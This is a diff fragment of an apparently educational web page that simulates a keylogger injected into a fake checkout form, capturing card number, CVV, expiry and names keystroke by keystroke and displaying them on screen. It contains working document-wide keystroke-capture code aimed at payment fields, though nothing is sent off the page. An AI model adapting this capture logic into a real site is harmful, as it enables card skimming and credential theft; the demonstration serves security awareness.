+    hb.textContent = isAttack ? "🚨 REAL-TIME KEYLOG EXFILTRATION: Credential stream sent to Attacker Om bobde!" : "DOM Input Event Dispatcher · Keypress Listener Hook Active";
+  }
+}
+
+  // ── State ──
+  let keyLog        = [];
+  let totalKeys     = 0;
+  let sensitiveKeys = 0;
+  let fieldsLogged  = new Set();
+  let activeField   = '';
+  let keystreamEl, streamInitialized = false;
+
+  // Sensitive field ids
+  const SENSITIVE_IDS = new Set(['i-card','i-cvv','i-expiry','i-name']);
+  const FIELD_LABELS  = {
+    'i-fname':'First Name', 'i-lname':'Last Name',
+    'i-addr':'Address',     'i-phone':'Phone',
+    'i-card':'💳 CARD',    'i-expiry':'Expiry',
+    'i-cvv':'CVV',          'i-name':'Name on Card'
+  };
+
+  function startSim() {
+    document.getElementById('intro-banner').style.display = 'none';
+    document.getElementById('fake-site').style.display    = 'block';
+    keystreamEl = document.getElementById('keystream');
+    injectKeylogger();
+  }
+
+  // ── The "injected" keylogger ──
+  function injectKeylogger() {
+    // Track focused field
+    document.addEventListener('focusin', e => {
+      const id = e.target.id;
+      if (!id || !id.startsWith('i-')) return;
+      activeField = id;
+      fieldsLogged.add(id);
+      document.getElementById('stat-fields').textContent = fieldsLogged.size;
+      updateReconLabel(id);
+    });
+
+    // Capture every keypress
+    document.addEventListener('keydown', e => {
+      const id = e.target.id;
+      if (!id || !id.startsWith('i-')) return;
+
+      const isSensitive = SENSITIVE_IDS.has(id);
+      const key = e.key;
+
+      if (key === 'Tab' || key === 'Shift') return;
+
+      totalKeys++;
+      if (isSensitive) sensitiveKeys++;
+      keyLog.push({ key, field: id, t: Date.now() });
+
+      document.getElementById('stat-keys').textContent      = totalKeys;
+      document.getElementById('stat-sensitive').textContent = sensitiveKeys;
+
+      appendToStream(key, isSensitive, id);
+      updateReconFields();
+    });
+  }
+
+  function appendToStream(key, isSensitive, fieldId) {
+    if (!streamInitialized) {
+      keystreamEl.innerHTML = '';
+      streamInitialized = true;
+    }
+
+    // Remove trailing cursor
+    const oldCursor = keystreamEl.querySelector('.cursor');
+    if (oldCursor) oldCursor.remove();
+
+    const label = FIELD_LABELS[fieldId];
+
+    // Field separator
+    if (keyLog.length === 1 || (keyLog.length > 1 && keyLog[keyLog.length-2].field !== fieldId)) {
+      const sep = document.createElement('span');
+      sep.className = 'key-special';
+      sep.textContent = ` [${label}] `;
+      keystreamEl.appendChild(sep);
+    }
+
+    let displayKey = key;
+    if (key === ' ')         displayKey = '·';
+    else if (key === 'Enter') displayKey = '↵\n';
+    else if (key === 'Backspace') displayKey = '⌫';
+    else if (key.length > 1)  displayKey = `[${key}]`;
+
+    const span = document.createElement('span');
+    span.className = isSensitive ? 'key-sensitive' : 'key-char';
+    span.textContent = displayKey;
+    keystreamEl.appendChild(span);
+
+    // Re-add cursor
+    const cursor = document.createElement('span');
+    cursor.className = 'cursor';
+    keystreamEl.appendChild(cursor);
+
+    keystreamEl.scrollTop = keystreamEl.scrollHeight;
+  }
+
+  function updateReconLabel(id) {
+    // highlight which recon field is active
+    document.querySelectorAll('.rf-value').forEach(el => el.classList.remove('active'));
+    if (id === 'i-card')   document.getElementById('r-card').classList.add('active');
+    if (id === 'i-expiry' || id === 'i-cvv') document.getElementById('r-exp-cvv').classList.add('active');
+    if (id === 'i-phone')  document.getElementById('r-phone').classList.add('active');
+    if (id === 'i-fname' || id === 'i-lname') document.getElementById('r-name').classList.add('active');
+  }
+
+  function getFieldText(id) {
+    const el = document.getElementById(id);
+    return el ? el.value : '';
+  }
+
+  function updateReconFields() {
+    const fname = getFieldText('i-fname');
+    const lname = getFieldText('i-lname');
+    if (fname || lname) document.getElementById('r-name').textContent = `${fname} ${lname}`.trim();
+
+    const phone = getFieldText('i-phone');
+    if (phone) document.getElementById('r-phone').textContent = phone;
+
+    const card = getFieldText('i-card');
+    if (card) document.getElementById('r-card').textContent = card;
+
+    const exp = getFieldText('i-expiry');
+    const cvv = getFieldText('i-cvv');
+    if (exp || cvv) document.getElementById('r-exp-cvv').textContent = `${exp || '??'} / ${cvv ? '•'.repeat(cvv.length) + ' (' + cvv + ')' : '??'}`;
+  }
+
+  function showReveal() {
+    // populate reveal
+    document.getElementById('o-keys').textContent   = totalKeys;
+    document.getElementById('o-card').textContent   = getFieldText('i-card') || '(not entered)';
+    document.getElementById('o-expiry').textContent = getFieldText('i-expiry') || '(not entered)';
+    document.getElementById('o-cvv').textContent    = getFieldText('i-cvv') || '(not entered)';
+    document.getElementById('o-name').textContent   = getFieldText('i-name') || '(not entered)';
+
+    const logStr = keyLog.map(e => {
+      const k = e.key === ' ' ? '·' : e.key;
+      return `[${FIELD_LABELS[e.field]||e.field}]:${k}`;
+    }).join(' ');
+    document.getElementById('o-log').textContent = logStr || '(no keystrokes recorded)';
+
+    document.getElementById('fake-site').style.display    = 'none';
+    document.getElementById('reveal-panel').style.display = 'block';
+  }
+
+  function restart() {
+    // reset state
+    keyLog = []; totalKeys = 0; sensitiveKeys = 0;
+    fieldsLogged = new Set(); activeField = '';
+    streamInitialized = false;
+
+    // reset UI
+    document.getElementById('reveal-panel').style.display = 'none';
+    document.getElementById('keystream').innerHTML = '<span style="color:#4a5568;font-family:monospace;font-size:12px">// Waiting for keystrokes...</span><span class="cursor"></span>';
+    document.getElementById('stat-keys').textContent = '0';
+    document.getElementById('stat-fields').textContent = '0';
+    document.getElementById('stat-sensitive').textContent = '0';
+    ['r-name','r-phone','r-card','r-exp-cvv'].forEach(id => {
+      document.getElementById(id).textContent = '—';
+    });
+    // reset form
+    ['i-fname','i-lname','i-addr','i-phone','i-card','i-expiry','i-cvv','i-name'].forEach(id => {
+      document.getElementById(id).value = '';
+    });
+
+    document.getElementById('fake-site').style.display = 'block';
+  }
+</script>
+
+<footer class="modern-footer">
+  <div class="footer-badge">
+    <span class="footer-text">Designed and developed by <strong class="dev-name">Irshad Akaram</strong></span>
+  </div>
+</footer>
+
+</body>
+</html>
